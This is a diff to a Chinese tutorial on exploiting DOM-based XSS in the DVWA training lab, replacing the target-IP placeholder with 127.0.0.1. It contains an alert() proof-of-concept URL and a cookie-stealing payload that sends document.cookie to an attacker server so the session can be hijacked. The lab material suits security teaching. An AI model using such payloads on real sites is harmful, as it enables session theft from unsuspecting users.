@@ -62,7 +62,7 @@ document.write("<option value='French'>French</option>");
 ### 1. 正常访问
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/xss_d/?default=English
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English
 ```
 
 页面下拉框中显示 English。
@@ -70,7 +70,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_d/?default=English
 ### 2. 提交 Payload
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
 ```
 
 浏览器弹出对话框，说明 DOM 型 XSS 存在。
@@ -118,7 +118,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</sc
 构造恶意链接：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>new Image().src='http://127.0.0.1:8000/steal?c='+document.cookie;</script>
 ```
 
 诱导受害者点击后，Cookie 会被发送到攻击者服务器。攻击者拿到 `PHPSESSID` 即可伪造会话。
@@ -130,7 +130,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>new Image().src='htt
 1. 拦截请求：
    ```http
     GET /dvwa/vulnerabilities/xss_d/?default=English&Submit=Submit HTTP/1.1
-    Host: 靶机IP
+    Host: 127.0.0.1
     Cookie: PHPSESSID=...; security=low
    ```
 2. 将 `default` 参数改为：
